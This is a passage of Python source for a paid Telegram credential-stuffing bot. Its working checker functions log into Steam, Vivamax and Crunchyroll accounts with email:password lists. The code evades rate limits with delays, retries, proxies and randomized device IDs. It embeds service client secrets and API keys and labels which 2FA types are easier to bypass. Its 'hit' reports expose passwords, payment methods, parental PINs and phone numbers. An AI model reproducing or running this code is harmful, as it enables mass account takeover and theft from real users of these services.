        await update.message.reply_text("❌ This command is only for the owner.")
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            "📋 <b>Usage:</b>\n\n"
            "<code>/setplan VIP</code> → update yourself\n"
            "<code>/setplan 1234567890 YEARLY</code> → update by user ID\n\n"
            "Available plans: FREE, BASIC, VIP, YEARLY",
            parse_mode='HTML'
        )
        return

    # Determine target and plan
    if len(args) == 1:
        target_user_id = ADMIN_ID
        new_plan = args[0].strip().upper()
    elif len(args) == 2:
        target = args[0].strip()
        new_plan = args[1].strip().upper()

        if target.startswith('@'):
            username = target[1:]
            response = supabase.table("user_stats").select("user_id").eq("username", username).execute()
            if not response.data:
                await update.message.reply_text(f"❌ User with username @{username} not found.")
                return
            target_user_id = response.data[0]["user_id"]
        else:
            try:
                target_user_id = int(target)
            except ValueError:
                await update.message.reply_text("❌ Invalid user ID or username format.")
                return
    else:
        await update.message.reply_text("❌ Wrong usage. Check /setplan for help.")
        return

    if new_plan not in ["FREE", "BASIC", "VIP", "YEARLY", "OWNER"]:
        await update.message.reply_text("❌ Invalid plan! Use: FREE, BASIC, VIP, YEARLY, or OWNER")
        return
    
    if new_plan == "OWNER" and target_user_id != ADMIN_ID:
        await update.message.reply_text("❌ OWNER plan can only be set for the bot owner!")
        return

    # ←←← FIXED: Always calculate fresh expiry date here
    if new_plan == "FREE":
        expires = "N/A"
    elif new_plan == "BASIC":
        expires = (datetime.now() + timedelta(days=7)).strftime("%Y-%m-%d")
    elif new_plan == "VIP":
        expires = (datetime.now() + timedelta(days=30)).strftime("%Y-%m-%d")
    elif new_plan == "YEARLY":
        expires = (datetime.now() + timedelta(days=365)).strftime("%Y-%m-%d")
    elif new_plan == "OWNER":
        expires = "N/A"

    defaults = PLAN_DEFAULTS[new_plan]

    update_data = {
        "plan": defaults["plan"],
        "base_plan_limit": defaults["base_plan_limit"],
        "threads": defaults["threads"],
        "expires": expires,                    # ← Fresh date every time
        "daily_reward_lines": 0,
        "referral_bonus_lines": 0
    }

    success = update_user_stats_general(target_user_id, update_data)

    if success:
        await update.message.reply_text(
            f"✅ <b>Plan updated successfully!</b>\n\n"
            f"👤 Target User: <code>{target_user_id}</code>\n"
            f"📌 New Plan: <b>{new_plan}</b>\n"
            f"🧵 Threads: <b>{defaults['threads']}</b>\n"
            f"📆 Expires: <b>{expires}</b>\n\n"
            f"Changes are live immediately.",
            parse_mode='HTML'
        )
    else:
        await update.message.reply_text("❌ Failed to update user. Make sure the user has used the bot before.")

async def show_settings_menu(query, context):
    context.user_data['in_main_menu'] = False
    """Replicates the exact Settings Menu"""
    # ←←← IMPORTANT: Clear waiting state when returning from Set Threads
    if 'waiting_for_threads' in context.user_data:
        context.user_data['waiting_for_threads'] = False
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)
    
    settings_text = f"""
⚙️ <b>Settings Menu</b>
━━━━━━━━━━━━━━━━━━━━━━━━
Configure your bot preferences below:

🧵 <b>Threads</b>: Control scan speed
Current: <code>{limits['current_threads']} threads</code> (Max: {limits['max_threads']})

📡 <b>API Mode</b>: Select scanning method
Current: <code>{get_mode_display(stats.get('api_mode'))}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
<i>Click a button to configure:</i>
    """.strip()
    
    keyboard = [
        [
            InlineKeyboardButton("🧵 Set Threads", callback_data="set_threads"),
            InlineKeyboardButton("📡 API Mode", callback_data="set_api_mode"),
        ],
        [InlineKeyboardButton("↼ Back", callback_data="back_to_main")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        settings_text,
        parse_mode='HTML',
        reply_markup=reply_markup
    )

async def handle_set_threads(query, context):
    context.user_data['in_main_menu'] = False
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)
    plan = limits["display_name"]
    max_t = limits["max_threads"]
    
    # New updated limits based on your current PLAN_CONFIG
    text = f"""
🧵 <b>Set Thread Count</b>
━━━━━━━━━━━━━━━━━━━━━━━━
Limits by plan:
🆓 FREE: <b>1-8</b>
⭐ BASIC: <b>1-25</b>
👑 VIP / YEARLY: <b>1-40</b>

Your plan <b>{get_plan_with_emoji(stats.get('plan'))}</b> allows <b>1-{max_t}</b> threads.

Current threads: <b>{limits['current_threads']}</b>
━━━━━━━━━━━━━━━━━━━━━━━━
Send a number between 1 and {max_t} to set your thread count.
    """.strip()
    
    keyboard = [[InlineKeyboardButton("↼ Back", callback_data="menu_settings")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(text, parse_mode='HTML', reply_markup=reply_markup)
    context.user_data['waiting_for_threads'] = True

async def show_api_mode_menu(query, context):
    context.user_data['in_main_menu'] = False
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    current_mode = stats.get("api_mode", "Crunchyroll")
    
    mode_info = MODES.get(current_mode, MODES["Crunchyroll"])
    
    # Build feature list
    features_text = "\n".join([f"✅ {feature}" for feature in mode_info["features"]])
    
    text = f"""
📡 <b>API Mode Selection</b>
━━━━━━━━━━━━━━━━━━━━━━━━
{get_proxyless_banner()}
<b>Current Mode:</b> <code>{mode_info["color"]} {mode_info["display"]}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
{mode_info["icon"]} <b>{mode_info["display"]}</b>
{features_text}
━━━━━━━━━━━━━━━━━━━━━━━━
Click on a mode below to switch:
    """.strip()

    # ====================== FULLY DYNAMIC KEYBOARD ======================
    keyboard = []
    modes_list = list(MODES.keys())
    
    # Main modes (everything except Steam)
    main_modes = [m for m in modes_list if m != "Steam"]
    
    # Create rows of 2 buttons for main modes
    for i in range(0, len(main_modes), 2):
        row = []
        for mode_key in main_modes[i:i+2]:
            info = MODES[mode_key]
            button_text = f"{info['color']} {info['display']}" if mode_key == current_mode else f"{info['icon']} {info['display']}"
            row.append(InlineKeyboardButton(button_text, callback_data=f"set_mode:{mode_key}"))
        keyboard.append(row)
    
    # Last row: Steam + Back to Settings (side by side - as you requested)
    steam_info = MODES["Steam"]
    steam_text = f"{steam_info['color']} {steam_info['display']}" if current_mode == "Steam" else f"{steam_info['icon']} {steam_info['display']}"
    
    keyboard.append([
        InlineKeyboardButton(steam_text, callback_data="set_mode:Steam"),
        InlineKeyboardButton("↼ Back to Settings", callback_data="menu_settings")
    ])

    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        text,
        parse_mode='HTML',
        reply_markup=reply_markup
    )

def format_hit_for_file(result, user_plan="FREE", mode="Crunchyroll"):
    """Tiered formatting for the downloaded Hits .txt file"""
    country_code = result.get('country', 'ZZ').upper()
    flag = REGION_HINTS.get(country_code, "🌍")
    expiry_display = get_days_remaining(result['expiry']) if result.get('expiry') else 'N/A'

    if mode == "Steam":
        twofa_type = result.get('twofa_type', 'None')
        if result.get('twofa'):
            line = f"🔐 2FA:{twofa_type} | {result['email']}:{result['password']} | SteamID: {result.get('steamid','N/A')}"
        else:
            line = f"✅ HIT | {result['email']}:{result['password']} | SteamID: {result.get('steamid','N/A')}"
        
        if result.get('games_count') is not None:
            line += f" | Games: {result['games_count']} | Playtime: {result.get('total_playtime', 0)}h"
        
        return line + "\n"

    if mode == "Vivamax":
        # === VIVAMAX RICH FORMAT (same as your standalone script) ===
        base = f"✅ HIT FOUND!\n"
        base += f"📧 Email: {result['email']}\n"
        base += f"🔑 Password: {result['password']}\n"
        base += f"👤 Name: {result.get('displayName', result.get('username', 'N/A'))}\n"
        base += f"📊 Status: {result.get('status', 'UNKNOWN')}\n"
        base += f"📌 Plan: {result.get('plan', 'Unknown')}\n"
        base += f"💰 Price: {result.get('price', 'N/A')}\n"
        base += f"📆 Billing: {result.get('billing', 'N/A')}\n"
        base += f"📅 Expires: {expiry_display}\n"
        base += f"⏳ Days Left: {result.get('days_left', 'N/A')}\n"
        base += f"🔄 Auto Renew: {result.get('auto_renew', '—')}\n"
        base += f"🔐 PIN: {result.get('pin', 'N/A')}\n"
        base += f"📱 Mobile: {result.get('mobile', 'N/A')}\n"
        base += f"🌍 Country: {country_code} {flag}\n"
        return base + "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    else:
        base = f"✅ HIT FOUND!\n"
        base += f"📧 Email: {result['email']}\n"
        base += f"🔑 Password: {result['password']}\n"
        base += f"📊 Plan: {result['plan']}\n"
        base += f"📆 Expires: {expiry_display}\n"
        base += f"🌍 Country: {country_code} {flag}\n"

        if user_plan == "FREE":
            return base + "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

        elif user_plan == "BASIC":
            extra = f"• User: {result.get('username', 'Unknown')}\n"
            extra += f"• Verified: {result['email_verified']}\n"
            extra += f"• Free Trial: {result['free_trial']}\n"
            return base + extra + "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

        else:  # VIP / YEARLY - Full details
            extra = f"• User: {result.get('username', 'Unknown')}\n"
            extra += f"• Verified: {result['email_verified']}\n"
            extra += f"• Created: {result['account_creation'] or 'N/A'}\n"
            extra += f"• Free Trial: {result['free_trial']}\n"
            extra += f"• Plan(SUB): {result.get('plan_sub', 'Unknown')}\n"
            extra += f"• Max Streams: {result.get('max_streams', 'Unknown')}\n"
            extra += f"• Currency: {result['currency'] or 'N/A'}\n"
            extra += f"• Payment: {result.get('payment_method', 'Unknown')}\n"
            return base + extra + "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

def format_single_result(result, user_plan="FREE", mode="Crunchyroll"):
    """Mode-aware formatting: Crunchyroll keeps original tiered look, Vivamax gets rich display"""
    country_code = result.get('country', 'ZZ').upper()
    flag = REGION_HINTS.get(country_code, "🌍")
    country_display = f"{country_code} {flag}" if country_code not in ["ZZ", "UNKNOWN", "", "Unknown"] else "Not Set"

    if not result.get('success', False):
        return f"""
❌ <b>CHECK FAILED</b>

📧 <b>Email:</b> <code>{result['email']}</code>

📌 <b>Status:</b> {result.get('message', 'Unknown error')}

Try another account!
        """.strip()

    expiry_display = get_days_remaining(result.get('expiry')) if result.get('expiry') else 'N/A'

    # ==================== STEAM ====================
    if mode == "Steam":
        visibility_emoji = "✅" if result.get('profile_visibility') == "Public" \
            else "🔒" if result.get('profile_visibility') == "Private" \
            else "👥"

        # Base header — no separator here
        text = f"""✅ <b>STEAM HIT!</b>

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>
🆔 <b>SteamID:</b> <code>{result.get('steamid', 'N/A')}</code>
🌍 <b>Country:</b> {country_display if country_code not in ["Unknown", "ZZ", "", "UNKNOWN"] else "Not Set by User"}"""

        # 2FA — separator ONLY appears when 2FA exists
        if result.get('twofa'):
            twofa_type = result.get('twofa_type', 'Unknown')
            if twofa_type == 'Authenticator':
                note = "Needs TOTP authenticator app"
            elif twofa_type == 'Email Guard':
                note = "Needs email inbox access"
            else:
                note = "Device confirmation needed"
            text += f"\n━━━━━━━━━━━━━━━━━━━━━━━━"
            text += f"\n🔐 <b>2FA Type:</b> <code>{twofa_type}</code>"
            text += f"\n📝 <b>Note:</b> {note}"

        # BASIC+ — profile + games
        if user_plan in ["BASIC", "VIP", "YEARLY"]:
            if result.get('games_count') == 0 and result.get('profile_visibility') == 'Public':
                games_privacy = "Hidden 🔒"
            else:
                games_privacy = "Visible ✅"
            result['games_privacy'] = games_privacy

            text += f"\n━━━━━━━━━━━━━━━━━━━━━━━━"
            text += f"\n{visibility_emoji} <b>Profile:</b> <code>{result.get('profile_visibility', 'Unknown')}</code>"
            text += f"\n🎮 <b>Games List:</b> <code>{result.get('games_privacy', 'Unknown')}</code>"

            if result.get('games_count') is not None:
                if result['games_count'] == 0:
                    text += "\n🎮 <b>Games Owned:</b> <code>0</code> <i>(Private/Family View)</i>"
                else:
                    text += f"\n🎮 <b>Games Owned:</b> <code>{result['games_count']}</code>"

        # VIP/YEARLY — playtime + top games
        if user_plan in ["VIP", "YEARLY"]:
            if result.get('total_playtime', 0) > 0:
                text += f"\n⏳ <b>Total Playtime:</b> <code>{result['total_playtime']:,} hours</code>"

            if result.get('games'):
                text += "\n🔥 <b>Top Games:</b>"
                for game in result['games'][:10]:
                    text += f"\n   • {game['name']} ({game['playtime_hours']}h)"

        # Single footer — always at the bottom
        text += f"\n━━━━━━━━━━━━━━━━━━━━━━━━"
        text += f"\nChannel: {CHANNEL_USERNAME}"
        return text
    
    # ==================== VIVAMAX ====================
    if mode == "Vivamax":
        # === RICH VIVAMAX FORMAT (same style as your standalone script) ===
        text = f"""
✅ <b>VIVAMAX HIT!</b>

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Name:</b> <code>{result.get('displayName', result.get('username', 'N/A'))}</code>
📊 <b>Status:</b> <code>{result.get('status', 'UNKNOWN')}</code>
📌 <b>Plan:</b> <code>{result.get('plan', 'Unknown')}</code>
💰 <b>Price:</b> <code>{result.get('price', 'N/A')}</code>
📆 <b>Billing:</b> <code>{result.get('billing', 'N/A')}</code>
📅 <b>Expires:</b> <code>{expiry_display}</code>
⏳ <b>Days Left:</b> <code>{result.get('days_left', 'N/A')}</code>
🔄 <b>Auto Renew:</b> <code>{result.get('auto_renew', '—')}</code>
🔐 <b>PIN:</b> <code>{result.get('pin', 'N/A')}</code>
📱 <b>Mobile:</b> <code>{result.get('mobile', 'N/A')}</code>
🌍 <b>Country:</b> <code>{country_display}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
Channel: {CHANNEL_USERNAME}
        """.strip()
    else:
        # === ORIGINAL CRUNCHYROLL TIERED FORMAT ===
        base = f"""
✅ <b>CRUNCHYROLL HIT!</b>

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
📊 <b>Account Details</b>
• <b>Active:</b> ✅ {result.get('active', 'False')}
• <b>Plan:</b> <code>{result.get('plan', 'None')}</code>
• <b>Expires In:</b> <code>{expiry_display}</code>
• <b>Country:</b> <code>{country_display}</code>
"""

        if user_plan == "FREE":
            extra = ""
        elif user_plan == "BASIC":
            extra = f"""
• <b>User:</b> <code>{result.get('username', 'Unknown')}</code>
• <b>Verified:</b> <code>{result.get('email_verified', 'No')}</code>
• <b>Free Trial:</b> <code>{result.get('free_trial', 'False')}</code>
"""
        else:  # VIP / YEARLY
            extra = f"""
• <b>User:</b> <code>{result.get('username', 'Unknown')}</code>
• <b>Verified:</b> <code>{result.get('email_verified', 'No')}</code>
• <b>Created:</b> <code>{result.get('account_creation', 'N/A')}</code>
• <b>Free Trial:</b> <code>{result.get('free_trial', 'False')}</code>
• <b>Plan(SUB):</b> <code>{result.get('plan_sub', 'Unknown')}</code>
• <b>Max Streams:</b> <code>{result.get('max_streams', 'Unknown')}</code>
• <b>Currency:</b> <code>{result.get('currency', 'N/A')}</code>
• <b>Payment:</b> <code>{result.get('payment_method', 'Unknown')}</code>
"""

        text = (base + extra + f"""
━━━━━━━━━━━━━━━━━━━━━━━━
Channel: {CHANNEL_USERNAME}
""").strip()

    return text

def pkcs1pad2(data: str, keysize: int):
    """PKCS1 padding used by Steam"""
    if keysize < len(data) + 11:
        return None
    
    buffer = [0] * keysize
    i = len(data) - 1
    
    while i >= 0 and keysize > 0:
        keysize -= 1
        buffer[keysize] = ord(data[i])
        i -= 1
    
    keysize -= 1
    buffer[keysize] = 0
    
    while keysize > 2:
        keysize -= 1
        buffer[keysize] = int.from_bytes(os.urandom(1), 'big') % 254 + 1
    
    keysize -= 1
    buffer[keysize] = 2
    keysize -= 1
    buffer[keysize] = 0
    
    result = 0
    for byte in buffer:
        result = (result << 8) | byte
    return result

def steam_rsa_encrypt(password: str, modulus_hex: str, exponent_hex: str) -> str | None:
    password = ''.join(char for char in password if ord(char) <= 127)
    n = int(modulus_hex, 16)
    e = int(exponent_hex, 16)
    keysize = (n.bit_length() + 7) >> 3

    padded_data = pkcs1pad2(password, keysize)  # your existing function
    if not padded_data:
        return None

    encrypted_data = pow(padded_data, e, n)
    hex_str = hex(encrypted_data)[2:]
    if len(hex_str) % 2 == 1:
        hex_str = '0' + hex_str
    hex_bytes = bytes.fromhex(hex_str)
    return base64.b64encode(hex_bytes).decode('ascii')

def check_steam(username: str, password: str, proxy=None, _retry=0) -> dict:
    """Steam Checker - Fixed 2FA detection (stricter, no more false positives)"""
    result = {
        'email': username,
        'password': password,
        'success': False,
        'profile_visibility': 'Unknown', 
        'message': '',
        'steamid': 'N/A',
        'twofa': False,
        'twofa_type': 'None',
        'profile_name': 'Unknown',
        'profile_url': '',
        'country': 'Unknown',
        'vac_banned': False,
        'limited': False,
        'games_count': 0,
        'total_playtime': 0,
        'games': []
    }

    try:
        session = requests.Session()
        time.sleep(random.uniform(0.5, 1.5)) 
        if proxy:
            session.proxies = {'http': proxy, 'https': proxy}

        # 1. Get RSA Key
        rsa_req = CAuthentication_GetPasswordRSAPublicKey_Request()
        rsa_req.account_name = username
        rsa_bytes = rsa_req.SerializeToString()
        rsa_base64 = base64.b64encode(rsa_bytes).decode("ascii")

        url_key = (
            "https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1"
            f"?origin=https%3A%2F%2Fstore.steampowered.com&input_protobuf_encoded={rsa_base64}"
        )

        resp = session.get(url_key, timeout=25)
        resp.raise_for_status()

        rsa_resp = CAuthentication_GetPasswordRSAPublicKey_Response()
        rsa_resp.ParseFromString(resp.content)

        modulus_hex = rsa_resp.publickey_mod.strip()
        exponent_hex = rsa_resp.publickey_exp.strip()
        timestamp = rsa_resp.timestamp

        # 2. Encrypt password
        encrypted_b64 = steam_rsa_encrypt(password, modulus_hex, exponent_hex)
        if not encrypted_b64:
            result['message'] = "RSA encryption failed"
            return result

        # 3. Begin Auth Session (Modern Protobuf)
        auth_req = CAuthentication_BeginAuthSessionViaCredentials_Request()
        auth_req.account_name = username
        auth_req.device_friendly_name = ""
        auth_req.encrypted_password = encrypted_b64
        auth_req.encryption_timestamp = timestamp
        auth_req.website_id = "Store"
        auth_req.platform_type = 2

        auth_bytes = auth_req.SerializeToString()
        auth_base64 = base64.b64encode(auth_bytes).decode("ascii")

        boundary = "----WebKitFormBoundaryuVO4LkJu0mV4BkLt"
        multipart_data = (
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="input_protobuf_encoded"\r\n\r\n'
            f"{auth_base64}\r\n"
            f"--{boundary}--\r\n"
        )

        headers = {
            "Host": "api.steampowered.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Origin": "https://store.steampowered.com",
            "Referer": "https://store.steampowered.com/",
        }

        url_auth = "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1"
        resp = session.post(url_auth, headers=headers, data=multipart_data, timeout=25)

        x_eresult = resp.headers.get('X-eresult', '')
        print(f"[DEBUG Steam] {username} | X-eresult: {x_eresult}")

        # ==================== FIXED 2FA DETECTION ====================
        is_twofa = False

        try:
            auth_resp = CAuthentication_BeginAuthSessionViaCredentials_Response()
            auth_resp.ParseFromString(resp.content)

            if hasattr(auth_resp, 'allowed_confirmations') and len(auth_resp.allowed_confirmations) > 0:
                confirmation_types = [c.confirmation_type for c in auth_resp.allowed_confirmations]
                
                if any(ct == 3 for ct in confirmation_types):
                    is_twofa = True
                    result['twofa_type'] = "Authenticator"   # hardest - needs TOTP app
                elif any(ct == 2 for ct in confirmation_types):
                    is_twofa = True
                    result['twofa_type'] = "Email Guard"     # easier - needs email access
                elif any(ct in [4, 5] for ct in confirmation_types):
                    is_twofa = True
                    result['twofa_type'] = "Device Guard"
                # type 0 = No Guard, skip entirely (was your bug)
                
                print(f"[DEBUG Steam] Types: {confirmation_types} | 2FA: {is_twofa}")

            if hasattr(auth_resp, 'steamid') and auth_resp.steamid:
                result['steamid'] = str(auth_resp.steamid)

        except Exception as e:
            print(f"[DEBUG Steam] Protobuf parse failed: {e}")

        # ==================== FINAL DECISION ====================
        if is_twofa:
            result['twofa'] = True
            result['success'] = True
            result['message'] = "2FA Required"
        elif x_eresult in ['1', 'OK'] or len(resp.content) > 50:
            result['success'] = True
            result['message'] = "Valid Account"
        elif x_eresult == '5':
            result['message'] = "Invalid username or password"
        elif x_eresult == '6':
            result['message'] = "Account not found"
        elif x_eresult == '84':
            if _retry < 2:  # max 2 retries
                wait = (8 + _retry * 5) + random.uniform(2, 4)
                print(f"[Steam] Rate limited, retry {_retry+1}/2 in {wait:.1f}s...")
                time.sleep(wait)
                return check_steam(username, password, proxy, _retry=_retry+1)
            else:
                result['message'] = "Rate limited by Steam, try again later"
                return result
        elif x_eresult == '2':
            result['message'] = "Account disabled / banned"
        elif x_eresult == '15':
            result['message'] = "Account does not exist"
        else:
            result['message'] = f"Unknown error (eresult: {x_eresult})"
            return result

        # ==================== RICH DATA (Games, Country, etc.) ====================
        # Runs for BOTH normal hits AND 2FA accounts
        if result['steamid'] != 'N/A':
            try:
                # Player Summary
                summary_url = f"https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key={STEAM_API_KEY}&steamids={result['steamid']}"
                summary_resp = requests.get(summary_url, timeout=15)
                if summary_resp.status_code == 200:
                    players = summary_resp.json().get("response", {}).get("players", [])
                    if players:
                        data = players[0]
                        result['profile_name'] = data.get("personaname", "Unknown")
                        result['profile_url'] = data.get("profileurl", "")
                        country = data.get("loccountrycode", "").strip()
                        result['country'] = country if country else "Unknown"
                        visibility = data.get("communityvisibilitystate", 1)
                        result['profile_visibility'] = {1: "Private", 2: "Friends Only", 3: "Public"}.get(visibility, "Unknown")

                # Owned Games
                games_count = 0
                games_list = []
                if STEAM_API_KEY and STEAM_API_KEY != "YOUR_STEAM_API_KEY_HERE":
                    games_url = f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v0001/?key={STEAM_API_KEY}&steamid={result['steamid']}&format=json&include_appinfo=1"
                    games_resp = requests.get(games_url, timeout=15)
                    if games_resp.status_code == 200:
                        games_data = games_resp.json().get("response", {})
                        games_count = games_data.get("game_count", 0)
                        games_list = games_data.get("games", [])

                if games_count == 0:
                    community_url = f"https://steamcommunity.com/actions/GetOwnedGames?steamid={result['steamid']}&format=json&include_appinfo=1"
                    community_resp = requests.get(community_url, timeout=15, headers={"User-Agent": "Mozilla/5.0"})
                    if community_resp.status_code == 200:
                        try:
                            comm_data = community_resp.json().get("response", {})
                            games_count = comm_data.get("game_count", 0)
                            games_list = comm_data.get("games", [])
                        except:
                            pass

                if games_list:
                    result['games_count'] = games_count
                    result['total_playtime'] = sum(g.get("playtime_forever", 0) for g in games_list) // 60
                    sorted_games = sorted(games_list, key=lambda x: x.get("playtime_forever", 0), reverse=True)[:12]
                    result['games'] = [
                        {"name": g.get("name", "Unknown Game"), "playtime_hours": g.get("playtime_forever", 0) // 60}
                        for g in sorted_games
                    ]

            except Exception as e:
                print(f"[Steam] Extra data error: {e}")

    except Exception as e:
        result['message'] = f"Error: {str(e)[:80]}"

    return result

def check_vivamax(email: str, password: str, proxy=None):
    """Real Vivamax Checker - Fully integrated with your bot"""
    result = {
        'email': email, 
        'password': password,
        'success': False,
        'message': '',
        'email_verified': 'Yes',
        'account_creation': '',
        'plan': 'Unknown',
        'currency': 'PHP',
        'subscribable': 'False',
        'free_trial': 'False',
        'expiry': 'N/A',
        'active': 'False',
        'country': 'PH',
        'username': 'N/A',
        'plan_sub': 'Unknown',
        'max_streams': '1',
        'payment_method': 'N/A',
        # Vivamax specific fields
        'displayName': 'N/A',
        'status': 'Unknown',
        'days_left': 'N/A',
        'stars': '—',
        'auto_renew': '—',
        'price': 'N/A',
        'billing': 'N/A',
        'pin': 'N/A',
        'mobile': 'N/A',
    }

    # Plan mapping (from your original script)
    PLAN_MAPPING = {
        "three_months_app": {"price": "₱419.00", "billing": "3 months"},
        "one_month": {"price": "₱169.00", "billing": "1 month"},
        "one_month_max2": {"price": "₱499.00", "billing": "1 month"},
        "six_months_max2": {"price": "₱2490.00", "billing": "6 months"},
        "one_year_max2": {"price": "₱4790.00", "billing": "1 year"},
        "vmx_club_1-month": {"price": "₱99.00", "billing": "1 month"},
        "vmx_club_3-months": {"price": "₱269.00", "billing": "3 months"},
        "vmx_club_6-months": {"price": "₱499.00", "billing": "6 months"},
        "vmx_club_1-year": {"price": "₱949.00", "billing": "1 year"},
    }

    try:
        # === 1. Firebase Login ===
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.6',
            'content-type': 'application/json',
            'origin': 'https://identity.vivamax.net',
            'referer': 'https://identity.vivamax.net/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        }

        resp = requests.post(
            "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBEUyk0R5bNsi_FCdK-L4Ztz5OENMA6O_U",
            json={"email": email, "password": password, "returnSecureToken": True},
            headers=headers,
            timeout=20
        )

        if resp.status_code != 200:
            result['message'] = "Invalid email or password"
            return result

        id_token = resp.json().get("idToken")
        if not id_token:
            result['message'] = "Login failed"
            return result

        # === 2. Vivamax Login ===
        login_headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://vivamax.net',
            'referer': 'https://vivamax.net/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'x-appname': 'Vivamax/release-R60-6'
        }

        device_payload = {
            "idToken": id_token,
            "deviceType": "COMP",
            "modelNo": "20030107",
            "deviceName": "Win32",
            "deviceId": "-459410908",
            "serialNo": "-459410908"
        }

        viva_resp = requests.post(
            "https://api2.vivamax.net/v1/viva/login",
            json=device_payload,
            headers=login_headers,
            timeout=20
        )

        if viva_resp.status_code not in (200, 201):
            result['message'] = f"Login failed ({viva_resp.status_code})"
            return result

        data = viva_resp.json()

        # === 3. Extract Data ===
        result['success'] = True
        result['username'] = data.get("displayName", "N/A")
        result['displayName'] = result['username']
        result['status'] = data.get("subscriptionStatus", data.get("status", "UNKNOWN")).upper()
        result['plan'] = data.get("subscriptionId", "Unknown")
        result['pin'] = data.get("parentalControlPin", "N/A")
        result['mobile'] = data.get("mobileNumber", "N/A")
        result['country'] = data.get("subscriptionLocation", data.get("registerLocation", "PH"))

        # Expiry & Days Left
        expiry_ts = data.get("subscriptionExpiryTime")
        if expiry_ts:
            try:
                expiry_date = datetime.fromtimestamp(expiry_ts / 1000)
                result['expiry'] = expiry_date.strftime("%Y-%m-%d")
                days_left = (expiry_date - datetime.now()).days
                result['days_left'] = str(days_left) if days_left >= 0 else "Expired"
            except:
                pass

        # Price & Billing
        plan_key = result['plan']
        if plan_key in PLAN_MAPPING:
            p = PLAN_MAPPING[plan_key]
            result['price'] = p["price"]
            result['billing'] = p["billing"]

        # Auto Renew
        sub = data.get("subscription", {})
        apple = sub.get("appleSubscriptionDetails", {})
        pending = apple.get("pending_renewal_info", [{}])[0]
        if pending.get("auto_renew_status") == "1":
            result['auto_renew'] = "ON"
        elif pending.get("auto_renew_status") == "0":
            result['auto_renew'] = "OFF"

        # Active status
        if result['status'] == "ACTIVE" and plan_key != "Unknown":
            result['active'] = 'Yes'
            result['plan_sub'] = result['plan']
            result['account_type'] = "Premium"
        else:
            result['active'] = 'No'
            result['account_type'] = "Expired" if result['status'] in ["EXPIRED", "INACTIVE"] else "Free"

        result['message'] = 'ACTIVE SUBSCRIPTION!' if result['active'] == 'Yes' else 'Valid account but no active plan'

    except Exception as e:
        result['message'] = f"Error: {str(e)[:100]}"

    return result

def check_crunchyroll(email, password, proxy=None):
    """FINAL VERSION - Stronger Payment Method extraction"""
    result = {
        'email': email,
        'password': password,
        'success': False,
        'message': '',
        'email_verified': 'No',
        'account_creation': '',
        'plan': 'None',
        'currency': 'N/A',
        'subscribable': 'False',
        'free_trial': 'False',
        'expiry': '',
        'active': 'False',
        'country': 'ZZ',
        'username': 'Unknown',
        'plan_sub': 'Unknown',
        'max_streams': 'Unknown',
        'payment_method': 'Unknown'
    }

    proxies = {'http': proxy, 'https': proxy} if proxy else None
    max_retries = 4

    for attempt in range(max_retries):
        try:
            device_id, _, _ = generate_random_device_info()
            user_agent = generate_random_user_agent()

            # ====================== LOGIN ======================
            token_url = "https://beta-api.crunchyroll.com/auth/v1/token"
            
            token_data = {
                "grant_type": "password",
                "username": email,
                "password": password,
                "scope": "offline_access",
                "client_id": "y2arvjb0h0rgvtizlovy",
                "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
                "device_type": "AppleTV",
                "device_id": device_id,
                "device_name": "AppleTV"
            }

            headers = {
                "host": "beta-api.crunchyroll.com",
                "x-datadog-sampling-priority": "0",
                "etp-anonymous-id": device_id,
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": user_agent,
                "accept-encoding": "gzip"
            }

            resp = requests.post(token_url, data=token_data, headers=headers, proxies=proxies, timeout=25)

            if resp.status_code == 200:
                access_token = resp.json().get('access_token')
                if not access_token:
                    continue
            elif resp.status_code == 401:
                result['message'] = "Invalid email or password"
                return result
            elif resp.status_code == 429:
                time.sleep(3 + attempt * 2)
                continue
            else:
                if attempt < max_retries - 1:
                    time.sleep(1.5 + random.uniform(0, 1))
                    continue
                result['message'] = f"Login failed (HTTP {resp.status_code})"
                return result

            acc_headers = {
                'Authorization': f'Bearer {access_token}',
                'User-Agent': user_agent,
                'etp-anonymous-id': str(uuid.uuid4()),
                'x-datadog-sampling-priority': '0',
                'accept-encoding': 'gzip'
            }

            acc_resp = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me",
                                  headers=acc_headers, proxies=proxies, timeout=25)

            if acc_resp.status_code == 200:
                acc_data = acc_resp.json()
